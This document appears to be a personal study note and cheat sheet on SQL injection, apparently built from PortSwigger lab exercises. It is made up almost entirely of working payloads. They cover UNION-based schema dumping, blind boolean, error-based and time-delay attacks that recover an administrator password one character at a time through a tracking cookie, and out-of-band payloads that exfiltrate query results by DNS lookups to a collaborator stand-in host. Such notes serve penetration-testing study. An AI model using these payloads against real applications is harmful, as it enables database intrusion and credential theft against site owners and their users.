# SQL injection 
## Introduction 
It is an attack in which an attacker inserts untrusted data in the application that results in revealing sensitive information of the database. 

SQL Injection (SQLi) is a code injection attack where an attacker manipulates the data being sent to the server to execute malicious SQL statements to control a web application’s database server, thereby accessing, modifying and deleting unauthorized data. This attack is mainly used to take over database servers. 


# Finding SQLi
1. make list of all input fields that it's possible to talk to DB 
	1. Authentication forms 
	2. Search Engines
	3. products (price, description, availability )
	4. also check the headers and cookies
3. Do active scan in burp for the requests that looks Sus
	1. blind sqli with time delays might not be detected using active scan, further manual testing  needed
4. try to to add the following 
	1. '
	2. ;
	3. --
	4. use intruder in burpsuite, and select the SQLi wordlist 
5. Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
6. Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
7. u need burp pro to detect and exploit Out-of-band SQLi
8. try to make use of SQLmap, it will just make the exploitation process much easier

# Exploiting SQLi

1. Union Operator
2. Boolean => blind
3. Error Based => blind 
4. Out-Of-Band 
5. Time-Based => blind 


## UNION 
### check the type of DB
```MYSQL
catergory=lifstyle'or 1=1-- => Oracle,Micorosoft,Mysql, PostgreSQL' # note there is no need for the space between the single qoute and the payload
catergory=lifstyle' or 1=1# =>PostgreSQL, Mysql'
```

### check the num of cols being returned 
```sql
catergory=lifstyle' order by 1 -- => 200 ? => continue '
catergory=lifstyle' order by 2 -- => 200 ? => continue'
catergory=lifstyle' order by 3 -- => 500 ? => there is only 2 cols being used  '
-- if in mysql 
catergory=lifstyle' union select 1,2,3 --
```

### check for the col with string type
```SQL
catergory=lifstyle' union select null,null,'a' -- => 500 ? => not the right col'
catergory=lifstyle' union select null,'a',null -- => 200 ? => the right col ' 

```

### check for the DB type again
```sql
catergory=lifstyle' union select null,@@version,null -- => 200 ? => MYsql or Microsoft'
catergory=lifstyle' union select null,version(),null -- => 200 ? => PostgresQL'
catergory=lifstyle' union select null,banner,null from v$version -- => 200 ? => Oracle'
```


### check the DB contents 
#### Mysql , Microsoft, PostgreSQL
##### Dump the tables names
```sql
catergory=lifstyle' union select null,table_name,null from information_schema.tables --
```
##### Dump the cols names of a table 
```sql
catergory=lifstyle' union select null,column_name,null from information_schema.columns where table_name ='tablename' -- 
```

#### Oracle 
##### Dump the tables names
```sql
catergory=lifstyle' union select null,table_name,null from all_tables -- 
```
##### Dump the cols names of a table 
```sql 
catergory=lifstyle' union select null,column_name,null from ALL_TAB_COLUMNS where table_name='table_name' -- 
```

### Blind Attacks 
- ==check the references for more DB types payloads==
#### Conditional responses 
- a diff response body between succeed and failed requests
```sql
Cookie: TrackingId=f6twzc7vSfDv8yrg'+and+1=1-- => welcome back '
Cookie: TrackingId=f6twzc7vSfDv8yrg'+and+1=2-- => no welcome back '
```

##### Dump the existence tables
```SQL
Cookie: TrackingId=f6twzc7vSfDv8yrg'+and+(select+'x'+from+users+limit+1)='x'-- => weclome back ? => users table exists'
-- here we will brute force agains the table_name till we get welcome back message
```
##### confirm a specific user existence
```sql
Cookie: TrackingId=f6twzc7vSfDv8yrg'+and+(select+'x'+from+users+where+user_name='administrator')='x'-- => weclome back ? => users table exists'
-- here if we know there is a user called administrator, we will brute force the column name untill we get a welcome back message
-- vise versa, if we know that there is a column called username, we will brute force the valid users => valid user = welcome back message
```
##### Get the length of the admin password
```SQL
Cookie: TrackingId=f6twzc7vSfDv8yrg'+and+(select+'x'+from+users+where+username='administrator' and length(password)=20)='x'-- ' 
-- u will try out the values from 1 to 50 e.g , the attempt within the response that contains the welcome back message will be the password length, in our case it's 20
```
##### Get the password of the admin 
```sql
Cookie: TrackingId=f6twzc7vSfDv8yrg'+and+(select+SUBSTRING(password,1,1)+from+users+where+username='administrator' and length(password)=20)='a'-- ' 
-- we will check the first char of the password, if it's a, check the second char, if not, check the b, c, d etc .. 
-- weheather u use burp intruder, sqlmap, or a custom python script to achive this mission
```
- ![[Pasted image 20230908013018.png]]

#### Conditional errors
- a diff in response status based on errors 
```sql
Cookie: TrackingId=fLnCztNur00UGAsB'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)-- => true condition => error 500'
```
##### Dump the existence tables
```sql
Cookie: TrackingId=fLnCztNur00UGAsB'||(SELECT+CASE+WHEN+((select+'a'+from+users+where+rownum=1)='a')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)-- => true condition => error 500 => there is a table called users'
-- here we will brute force agains the table_name till we get welcome back message
```
##### Confirm a specific user existence
```sql
Cookie: TrackingId=fLnCztNur00UGAsB'||(SELECT+CASE+WHEN+((select+'a'+from+users+where+username='administrator')='a')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)-- => true condition => error 500 => there is a user called administrator
```
##### Get the length of the admin password
```sql
Cookie: TrackingId=fLnCztNur00UGAsB'||(SELECT+CASE+WHEN+((select+'a'+from+users+where+username='administrator' and length(password)=20)='a')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)-- => true condition => error 500 => the password length is 20 '
-- u will try out the values from 1 to 50 e.g , the attempt within the response that code is 500 error message will be the password length, in our case it's 20
```
##### Get the Admin's password
```sql
Cookie: TrackingId=fLnCztNur00UGAsB'||(SELECT+CASE+WHEN+((select+SUBSTR(password,1,1)+from+users+where+username='administrator')='a')-- => true condition => error 500 => there first letter is a 
```
- ![[Pasted image 20230908030150.png]]

#### Visible error-based
##### generate an error
```sql
Cookie: TrackingId=fLnCztNur00UGAsB'
```
##### leak data
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' AND (1=CAST((SELECT username from users limit 1) AS int))-- 'https://portswigger.net/web-security/sql-injection/cheat-sheet

Cookie: TrackingId=fLnCztNur00UGAsB' AND (1=CAST((SELECT password from users limit 1) AS int))-- '
```


#### Time Delays 
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (SELECT pg_sleep(10))-- => delay in response => valid sqli
```

##### Confirm users table exists and admin user
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (SELECT case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)-- => delay in response => valid sqli
```
##### Get the password length
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (SELECT case when (username='administrator' and length(password)=20) then pg_sleep(10) else pg_sleep(-1) end from users)-- => delay in response => valid sqli
##```
##### Enumerate the password 
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (SELECT case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)-- => delay in response => valid sqli
```
- ![[Pasted image 20230908041354.png]]


### Out-Of-Band -- u need burp collaborator for this attack
#### DNS lookup
##### Oracle 
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual -- '
```
##### Microsoft
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a') --
```
##### PostgreSQL
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN') --
```
##### Mysql
```sql
-- works in windows only
Cookie: TrackingId=fLnCztNur00UGAsB' || (LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')) --'

or 

Cookie: TrackingId=fLnCztNur00UGAsB' (SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a') --
```

#### DNS lookup with data exfiltration 
##### Oracle 
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' union (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) -- '
```
##### Microsoft
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')) --
```
##### PostgreSQL
```sql
Cookie: TrackingId=fLnCztNur00UGAsB' || (`create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();`) --
```
##### Mysql
```sql
-- works in windows only
Cookie: TrackingId=fLnCztNur00UGAsB' || (SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a')) --'
```

---
---
#### Finding usernames logged in
##### Mysql
```sql
catergory=lifstyle' union select 1,2,current_user() --
```
#### Concatenate
```sql
catergory=lifstyle' union select 1,2,concat(username,":",password) from users --
```
### References
- https://portswigger.net/web-security/sql-injection/cheat-sheet